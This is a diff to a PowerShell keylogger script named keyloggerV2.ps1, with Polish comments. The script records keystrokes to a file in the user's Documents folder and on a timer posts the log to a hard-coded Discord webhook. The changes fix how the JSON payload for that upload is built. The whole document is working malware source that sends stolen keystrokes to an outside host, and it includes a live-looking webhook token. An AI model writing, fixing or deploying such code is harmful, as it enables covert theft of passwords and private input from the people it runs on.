@@ -1,6 +1,9 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
+# Komunikat, który mówi, że skrypt się załadował
+Write-Host "Skrypt keyloggerV2.ps1 uruchomiony!"
+
 # Ścieżka do pliku logu
 $logPath = "$env:USERPROFILE\Documents\keylogger.txt"
 $webhook = "https://discord.com/api/webhooks/1360942823821803540/9I6AgpJboKwPSgnCIfbxFshdEwhYTyOHrlYrNlnY-UkJvc1SjTyAtEu-8-KEyWv3iCuU"
@@ -32,13 +35,17 @@ function Send-To-Discord {
                 $content = $content.Substring(0, $maxLen) + "`n[...]"
             }
 
+            # Poprawiona definicja payload w HashTable
             $payload = @{
                 "content" = "📝 **Keylogger log:**`n```\n$content\n```"
-            } | ConvertTo-Json -Depth 10
+            }
+
+            # Konwertowanie na JSON
+            $payloadJson = $payload | ConvertTo-Json -Depth 10
 
             try {
                 Write-Host "Wysyłam logi na Discorda..."
-                Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
+                Invoke-RestMethod -Uri $webhook -Method Post -Body $payloadJson -ContentType 'application/json'
                 Clear-Content -Path $logPath
             } catch {
                 Write-Host "❌ Błąd wysyłania na Discorda: $_"
@@ -55,7 +62,7 @@ $sendTimer.add_Elapsed({ Send-To-Discord })
 $sendTimer.Start()
 
 # Rejestracja klawiszy
-Register-ObjectEvent -InputObject [System.Windows.Forms.Control]::new() -EventName KeyDown -Action {
+$null = Register-ObjectEvent -InputObject [System.Windows.Forms.Control]::new() -EventName KeyDown -Action {
     param($sender, $e)
     $key = $e.KeyCode.ToString()
     if ($e.Control -and $e.KeyCode -eq "C") { $key = "[Ctrl+C]" }
